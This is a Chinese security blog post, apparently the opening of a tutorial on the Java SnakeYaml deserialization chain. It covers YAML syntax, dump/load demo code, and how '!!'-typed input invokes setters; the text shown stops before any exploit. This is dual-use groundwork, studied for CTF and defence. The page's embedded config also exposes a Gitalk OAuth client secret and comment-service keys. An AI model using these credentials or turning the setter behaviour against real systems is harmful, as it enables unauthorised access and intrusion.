<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="Drunkbaby">
    
    <title>
        
            Java反序列化之 SnakeYaml 链 |
        
        Drunkbaby&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/avatar.svg">
    
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/font/css/brands.min.css">
    
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/avatar.svg","avatar":"/images/avatar.svg","font_size":"15px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"9Ky0YY6Ij33nFC4KZ2VcGh9k-MdYXbMMI","appkey":"qqN77H4k2Hxhg7ZJ88Lf0xxM","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":"Drun1baby","github_admins":null,"repository":"gitalk-restore","client_id":"e5b5e5c0ba918eb3d3c4","client_secret":"a0ac0e6f2078095bce9291f42acd13b67e059dff","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"version":"3.7.3"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Drunkbaby's Blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container border-box">

    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/logo.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               Drunkbaby&#39;s Blog
            </a>
        </div>

        <div class="right border-box">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">

                

                    <div class="fade-in-down-animation">
    <div class="post-page-container border-box">

        <div class="article-content-container border-box">

            <div class="article-title">
                <span class="title-hover-animation">Java反序列化之 SnakeYaml 链</span>
            </div>

            
                <div class="article-header border-box">
                    
                        <div class="avatar-box border-box">
                            <img src="/images/avatar.svg">
                        </div>
                    
                    <div class="info-box">
                        <div class="author">
                            <span class="name">Drunkbaby</span>
                            
                                <span class="author-label">Lv6</span>
                            
                        </div>
                        <div class="meta-info border-box">
                            

<div class="article-meta-info-container border-box post">
    <div class="article-meta-info border-box">
        


        
            <span class="meta-info-item article-create-date">
                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
                <span class="pc">2022-10-16 14:56:52</span>
                <span class="mobile">2022-10-16 14:56</span>
            </span>

            <span class="meta-info-item article-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="pc">2023-03-29 21:58:28</span>
            </span>
        

        
            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul>
                    
                            <li class="category-item">
                                
                                <a href="/categories/Java/">Java</a>
                            </li>
                        
                    
                </ul>
            </span>
        

        
            <span class="article-tag meta-info-item border-box">
                <i class="icon fas fa-tags"></i>&nbsp;
                <ul>
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java/">Java</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item article-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.2k 字</span>
            </span>
        
        
            <span class="meta-info-item article-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>29 分钟</span>
            </span>
        
        
            <span class="meta-info-item article-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <p>Java SnakeYaml 链</p>
<span id="more"></span>
<h1 id="Java-反序列化之-SnakeYaml-链"><a href="#Java-反序列化之-SnakeYaml-链" class="headerlink" title="Java 反序列化之 SnakeYaml 链"></a>Java 反序列化之 SnakeYaml 链</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近感觉各大 CTF 比赛里面都很喜欢出这条 SnakeYaml 的链子，今天就来看一看这条链子。看了一些基础内容，发现和 Python  Pickle 反序列化比较相似，可能 Pickle 反序列化的懒癌也必须要解决了呜呜</p>
<h2 id="0x02-Yaml-基础"><a href="#0x02-Yaml-基础" class="headerlink" title="0x02 Yaml 基础"></a>0x02 Yaml 基础</h2><h3 id="Yaml-语法"><a href="#Yaml-语法" class="headerlink" title="Yaml 语法"></a>Yaml 语法</h3><ul>
<li>比较基础的内容，简单过一遍。</li>
</ul>
<p>SnakeYaml 是 Java 的 yaml 解析类库，支持 Java 对象的序列化&#x2F;反序列化，在反序列化的基础第一篇文章里面我就有说 Yaml 也是序列化&#x2F;反序列化的一种协议；我们先了解一下 yaml 语法</p>
<ol>
<li>YAML 大小写敏感；</li>
<li>使用缩进代表层级关系，这点和 properties 文件的差别非常之大</li>
<li>缩进只能使用空格，不能使用 TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li>
</ol>
<p>YAML 支持三种数据结构：</p>
<p>1、对象</p>
<p>使用冒号代表，格式为 <code>key: value</code> 。冒号后面要加一个空格：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure>

<p>可以使用缩进表示层级关系：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">    <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">    <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure>

<p>2、数组</p>
<p>使用一个短横线加一个空格代表一个数组项：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hobby:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Java</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">LOL</span></span><br></pre></td></tr></table></figure>

<p>3、常量</p>
<p>YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2022-07-28</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2022-07-28T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure>

<p>看师傅推荐了一个 yml 文件转 yaml 字符串的地址，网上部分 poc 是通过 yml 文件进行本地测试的，实战可能用到的更多的是 yaml 字符串。<a class="link"   target="_blank" rel="noopener" href="https://www.345tool.com/zh-hans/formatter/yaml-formatter" >https://www.345tool.com/zh-hans/formatter/yaml-formatter<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="SnakeYaml-序列化与反序列化"><a href="#SnakeYaml-序列化与反序列化" class="headerlink" title="SnakeYaml 序列化与反序列化"></a>SnakeYaml 序列化与反序列化</h3><p>pom.xml 如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>SnakeYaml 提供了 <code>Yaml.dump()</code> 和 <code>Yaml.load()</code> 两个函数对 yaml 格式的数据进行序列化和反序列化。</p>
<ul>
<li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个 Java 对象；</li>
<li>Yaml.dump()：将一个对象转化为 yaml 文件形式；</li>
</ul>
<p>dump 是序列化，load 是序列化，这和 Python Pickle 反序列化的一样的</p>
<p>写个序列化与反序列化的 Demo</p>
<p>先写个实体类 <strong>Person.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeTest;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> Integer age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span>&#123;  </span><br><span class="line">    <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">    person.setName(<span class="string">&quot;Drunkbaby&quot;</span>);  </span><br><span class="line">    person.setAge(<span class="number">20</span>);  </span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">    System.out.println(str);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>


<p>反序列化的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span>&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;!!SerializeTest.Person &#123;age: 20, name: Drunkbaby&#125;&quot;</span>;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;age: 20\n&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;name: Drunkbaby&quot;</span>;  </span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">    yaml.load(str1);  </span><br><span class="line">    yaml.loadAs(str2, Person.class);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化值 <code>!!SerializeTest.Person &#123;age: 20, name: Drunkbaby&#125;</code></p>
<p>这里的 <code>!!</code> 类似于 Fastjson 中的 <code>@type</code> 用于指定反序列化的全类名</p>
<ul>
<li>一开始以为只是这么简单的事儿，看了 Y4tacker 师傅的文章提到了要关于自动调用 <code>getter/setter</code> 的东西，感觉非常有意义。</li>
</ul>
<p>如果一个库的反序列化方法，能够自动调用 <code>getter/setter</code> 方法，那无疑是很危险的，比如 Fastjson hh</p>
<p>改进了 <strong>Person.java</strong>，代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeTest;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> Integer age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数被调用&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来看一看进行反序列化的时候，发生了什么</p>


<p>很明显，调用了 setter 方法，如果我把反序列化的语句改成 <code>&quot;!!SerializeTest.Person &#123;name: Drunkbaby&#125;&quot;</code>，那么就只会调用 <code>setter</code> 中的 setName 方法</p>
<ul>
<li>同样，对于 <code>loadAs()</code> 与 <code>loads()</code> 也是如此，会调用对应的 <code>setter</code> 方法</li>
</ul>


<h3 id="一些小坑的探索"><a href="#一些小坑的探索" class="headerlink" title="一些小坑的探索"></a>一些小坑的探索</h3><ul>
<li>发现自己的有些基础性的东西还是不够敏感，修改了 <strong>Person.java</strong>，新增一个 public 的 school 以及 protected 的 province</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeTest;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> Integer age;  </span><br><span class="line">    <span class="keyword">public</span> String school;  </span><br><span class="line">    <span class="keyword">protected</span> String province;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSchool</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getSchool 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> school;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSchool</span><span class="params">(String school)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setSchool 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.school = school;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProvince</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProvince 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> province;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProvince</span><span class="params">(String province)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setProvince 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.province = province;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数被调用&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge 方法被调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在序列化的时候发现，<code>getSchool</code> 这个方法没被调用</p>


<p>我们再去看一下反序列化的时候调用了哪些方法</p>


<p>此处就出现了很有意思的地方，按照道理来说 public 类型的属性，是不会有这些问题的，有问题起码也是 protected 或者其他类型的属性，下面我们来打断点尝试分析一下。</p>
<h3 id="SnakeYaml-序列化与反序列化的调试分析"><a href="#SnakeYaml-序列化与反序列化的调试分析" class="headerlink" title="SnakeYaml 序列化与反序列化的调试分析"></a>SnakeYaml 序列化与反序列化的调试分析</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>进来之后，是 <code>dump()</code> 方法，它先是 new 了一个 ArrayList，准备将之后序列化完成的数据存储到这个 ArrayList 里面</p>


<p>跟进 <code>dumpAll()</code>，它是在做 <code>dump()</code> 的业务，把 Java 对象转换为 Yaml 类型的字符串。</p>


